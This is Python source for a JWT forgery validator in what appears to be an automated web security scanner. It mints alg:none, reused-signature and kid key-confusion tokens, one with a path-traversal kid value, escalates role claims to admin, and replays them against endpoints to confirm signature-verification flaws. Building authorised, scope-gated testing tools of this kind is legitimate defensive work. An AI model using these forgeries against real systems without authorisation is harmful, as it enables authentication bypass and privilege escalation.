"""
JWT forgery confirmation leg (deterministic, pure Python -- no host tool).

The jwt agent can only GUESS that a hand-rolled JWT verifier is weak. This proves
it: take the real token the request carried, mint FORGED variants, replay the same
request as each, and compare against a garbage-signature token. If a forged token
is accepted where garbage is rejected, the server is not verifying the signature --
a confirmed authentication bypass / privilege escalation.

Two forgeries, both classic hand-rolled-verifier bugs:
  - alg:none  -- header alg set to "none", signature stripped. A verifier that
                honours "none" accepts an unsigned token.
  - payload tamper, original signature kept -- claims changed but the ORIGINAL
                signature reused. A verifier that never actually checks the
                signature (or checks the wrong bytes) accepts it.
Each forgery ALSO escalates role-shaped claims (role->admin, is_admin->true, ...),
so acceptance is not just a bypass but a privilege gain.

Confirmation requires a CONTROL: a garbage-signature token must be REJECTED. That
rules out "the endpoint ignores auth entirely" (which the access-control legs
cover) -- here we specifically prove the signature check is broken.

GET-only and scope-gated, like the other replay legs. Deterministic; no LLM.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import secrets
from urllib.parse import urlsplit

import httpx

import global_throttle
import missing_auth_probe as map_
from models import Finding, HttpExchange
from .base import Validator, ValidationResult

_JWT_RE = re.compile(r"\b(eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*)\b")
# Claims that, when present, we flip to an elevated value -- so a confirmed forge
# is a privilege escalation, not just a re-sign of the same identity.
_ROLE_CLAIMS = {"role": "admin", "roles": ["admin"], "is_admin": True, "admin": True,
                "isadmin": True, "user_role": "admin", "scope": "admin", "authz": "admin",
                "privilege": "admin", "group": "admin"}


def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _extract_jwt(headers: dict) -> tuple[str, str] | None:
    """(header_name, token) for the first JWT found in Authorization or Cookie."""
    for k, v in (headers or {}).items():
        m = _JWT_RE.search(v or "")
        if m:
            return k, m.group(1)
    return None


def _decode(token: str):
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except (ValueError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, parts[2]


def _escalate(payload: dict) -> dict:
    p = dict(payload)
    for claim, elevated in _ROLE_CLAIMS.items():
        if claim in p:
            p[claim] = elevated
    return p


def _forge_alg_none(header: dict, payload: dict) -> str:
    h = dict(header); h["alg"] = "none"
    return (_b64url_encode(json.dumps(h, separators=(",", ":")).encode())
            + "." + _b64url_encode(json.dumps(_escalate(payload), separators=(",", ":")).encode()) + ".")


def _forge_keep_sig(header: dict, payload: dict, sig: str) -> str:
    return (_b64url_encode(json.dumps(header, separators=(",", ":")).encode())
            + "." + _b64url_encode(json.dumps(_escalate(payload), separators=(",", ":")).encode())
            + "." + sig)


def _hs256(header: dict, payload: dict, key: bytes) -> str:
    """A validly HS256-signed token over the (escalated) payload with `key`."""
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(_escalate(payload), separators=(",", ":")).encode())
    sig = hmac.new(key, f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _kid_forgeries(header: dict, payload: dict) -> list[tuple[str, str]]:
    """`kid` key-confusion variants (V9). When a verifier derives the HMAC key
    from the attacker-controlled `kid` header, the key is known, so a validly
    HS256-signed forgery is accepted:
      - kid used DIRECTLY as the key: kid=S, key=S (the naive impl).
      - kid -> a file that reads empty / fails to read, and the impl falls back to
        an EMPTY key: kid=/dev/null|nonexistent, key=b"".
    All are properly HS256-signed with the key the kid implies, so they pass a
    real signature check under the confused key -- distinct from alg:none."""
    out: list[tuple[str, str]] = []
    sentinel = "harnesskid" + secrets.token_hex(3)
    h_direct = {**header, "alg": "HS256", "kid": sentinel}
    out.append((f"kid used as HMAC key (kid={sentinel!r})", _hs256(h_direct, payload, sentinel.encode())))
    for kid in ("../../../../../../../../dev/null", "/dev/null", f"/nonexistent-{secrets.token_hex(3)}"):
        h_empty = {**header, "alg": "HS256", "kid": kid}
        out.append((f"kid->empty/unreadable file, empty-key fallback (kid={kid!r})",
                    _hs256(h_empty, payload, b"")))
    return out


class JwtForgeValidator(Validator):
    name = "jwt_forge"
    finding_classes = {"jwt", "algorithm_confusion", "jwt_algorithm_confusion",
                       "authentication_bypass", "broken_authentication", "weak_token"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 run_context=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self.run_context = run_context

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        # Fire on a jwt-ish finding OR whenever the request actually carries a JWT
        # (an agent may mislabel the class but the token is right there to test).
        low = (finding.vulnerability_class or "").lower()
        jwtish = super().applies(finding, exchange) or "jwt" in low or "token" in low or "algorithm" in low
        return jwtish and _extract_jwt(exchange.request_headers or {}) is not None

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "jwt", summary=why)

    async def _probe(self, url: str, headers: dict) -> tuple[int | None, str]:
        try:
            if self.run_context is not None:
                from run_context import ScopePolicy, TypedRequest
                credential_headers = {k: v for k, v in headers.items()
                                      if k.lower() in ("authorization", "cookie", "proxy-authorization")}
                session_ref = "jwt-forge:" + hashlib.sha256(
                    repr(sorted(credential_headers.items())).encode()).hexdigest()[:16]
                self.run_context.sessions.register(
                    session_ref, session_ref, credential_headers,
                    allowed_origins=[ScopePolicy.origin_of(url)], role="negative-control")
                request_headers = {k: v for k, v in headers.items()
                                   if k.lower() not in ("authorization", "cookie", "proxy-authorization")}
                outcome = await self.run_context.executor().execute(
                    TypedRequest("GET", url, headers=request_headers),
                    capability=self.name, session_ref=session_ref)
                if not outcome.ok:
                    return None, ""
                return outcome.status, outcome.body or ""
            await global_throttle.acquire()
            async with httpx.AsyncClient(timeout=self.timeout, follow_redirects=False, verify=False) as client:
                r = await client.get(url, headers=headers or None)
            return r.status_code, (r.text or "")
        except httpx.HTTPError:
            return None, ""

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        if (exchange.method or "GET").upper() != "GET":
            return self._skip("jwt-forge replay is GET-only (safe)")
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        found = _extract_jwt(exchange.request_headers or {})
        if not found:
            return self._skip("no JWT in the request to forge")
        hdr_name, token = found
        decoded = _decode(token)
        if not decoded:
            return self._skip("token is not a decodable JWT")
        header, payload, sig = decoded

        def _hdrs(tok: str) -> dict:
            h = {k: v for k, v in (exchange.request_headers or {}).items() if k.lower() != hdr_name.lower()}
            orig = (exchange.request_headers or {}).get(hdr_name, "")
            h[hdr_name] = _JWT_RE.sub(tok, orig) if _JWT_RE.search(orig) else f"Bearer {tok}"
            return h

        # CONTROL: a garbage-signature token must be rejected, else the endpoint
        # isn't verifying anything and "forged accepted" would be meaningless.
        garbage = f"{token.rsplit('.', 1)[0]}.{_b64url_encode(b'not-a-valid-signature-xxxx')}"
        g_status, g_body = await self._probe(exchange.url, _hdrs(garbage))
        if g_status is None:
            return ValidationResult(self.name, "error", "jwt", summary="garbage-token control probe failed")
        if map_._substantive(g_status, g_body):
            return self._skip("endpoint accepts a garbage-signature token too -- not a signature-verification "
                              "bug (the endpoint isn't checking the token at all; an access-control leg covers that)")

        forgeries = [("alg:none", _forge_alg_none(header, payload)),
                     ("payload-tamper (original signature reused)", _forge_keep_sig(header, payload, sig))]
        forgeries += _kid_forgeries(header, payload)
        for label, forged in forgeries:
            f_status, f_body = await self._probe(exchange.url, _hdrs(forged))
            if f_status is not None and map_._substantive(f_status, f_body):
                kidnote = " (kid key-confusion)" if "kid" in label else ""
                return ValidationResult(
                    self.name, "confirmed", "jwt", confidence=0.9, confirmed=True,
                    summary=f"JWT signature not verified: a forged token ({label}) was accepted where a "
                            f"garbage-signature token was rejected -- authentication bypass / privilege "
                            f"escalation{kidnote}.",
                    evidence=(f"garbage token -> HTTP {g_status} (rejected); forged {label} with elevated claims -> "
                              f"HTTP {f_status} (accepted) at {exchange.url}. The verifier honours the forged token."),
                    raw_output=(f_body or "")[:600])
        return ValidationResult(
            self.name, "not_confirmed", "jwt", confidence=0.6, confirmed=False,
            summary="JWT signature appears to be verified: alg:none, reused-signature, and kid "
                    "key-confusion forgeries were all rejected like the garbage control.",
            evidence=f"garbage -> HTTP {g_status}; all {len(forgeries)} forgeries rejected at {exchange.url}.")
